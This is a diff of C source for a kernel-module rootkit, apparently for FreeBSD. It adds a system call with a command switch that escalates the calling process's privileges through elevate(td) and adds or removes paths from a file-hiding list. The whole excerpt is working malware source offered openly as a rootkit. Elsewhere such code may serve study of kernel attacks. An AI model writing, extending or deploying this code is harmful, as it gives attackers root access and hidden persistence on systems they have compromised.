@@ -20,22 +20,42 @@
 
 /* The system call's arguments. */
 struct rootkit_args {
+	int command;
+	char * args; 
 };
 
 /* The system call function. */
-static int rootkit_func(struct thread *td, void *syscall_args) {
+static int main(struct thread *td, void *syscall_args) {
+
 	struct rootkit_args *uap;
 	uap = (struct rootkit_args *)syscall_args;
-
-	elevate(td);
+	uprintf("uap command: %d\nuap args: %s\n", uap->command, uap->args);
+	switch(uap->command){
+		case 0:// Unload
+			break;
+		case 1:// Escalate
+			elevate(td);
+			break;
+		case 2:// File hide
+			uprintf("Adding: %s\n", uap->args);
+			add_file(uap->args);
+			break;
+		case 3:
+			uprintf("Removing %s\n", uap->args);
+			remove_file(uap->args);
+			break;
+		default:
+			uprintf("Bad command\n");
+			break;
+	}
 
 	return(0);
 }
 
 /* The sysent for the new system call. */
 static struct sysent rootkit_sysent = {
-	0,			/* number of arguments */
-	rootkit_func		/* implementing function */
+	2,			/* number of arguments */
+	main		/* implementing function */
 };
 
 /* The offset in sysent[] where the system call is to be allocated. */
